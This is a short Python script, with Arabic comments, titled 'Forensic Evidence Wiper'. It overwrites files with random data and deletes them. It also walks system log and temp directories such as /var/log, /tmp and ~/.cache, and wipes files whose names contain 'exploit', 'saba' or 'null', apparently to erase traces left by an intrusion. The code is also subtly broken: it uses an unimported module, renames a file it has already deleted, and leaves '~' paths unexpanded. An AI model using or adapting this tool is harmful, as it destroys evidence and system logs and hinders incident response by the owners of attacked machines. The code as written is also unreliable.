#!/usr/bin/env python3
# Forensic Evidence Wiper

import os
import shutil
import random

class ForensicWiper:
    @staticmethod
    def secure_delete(file_path, passes=7):
        """حذف آمن للملف (7 تمريرات)"""
        if not os.path.exists(file_path):
            return False
            
        try:
            length = os.path.getsize(file_path)
            
            with open(file_path, 'wb') as f:
                for _ in range(passes):
                    # كتابة بيانات عشوائية
                    f.seek(0)
                    f.write(os.urandom(length))
                    
            # حذف الملف نهائياً
            os.unlink(file_path)
            
            # محو اسم الملف من نظام الملفات
            new_name = ''.join(random.choices(string.hexdigits, k=32))
            try:
                os.rename(file_path, new_name)
                os.unlink(new_name)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"[-] Secure delete failed: {e}")
            return False
            
    @staticmethod
    def clear_logs():
        """محو سجلات النظام"""
        log_dirs = [
            '/var/log/',
            '/tmp/',
            '/var/tmp/',
            '~/.cache/',
            '~/.local/share/'
        ]
        
        for log_dir in log_dirs:
            if os.path.exists(log_dir):
                try:
                    for root, dirs, files in os.walk(log_dir):
                        for file in files:
                            if any(x in file for x in ['saba', 'null', 'exploit']):
                                file_path = os.path.join(root, file)
                                ForensicWiper.secure_delete(file_path)
                except:
                    pass
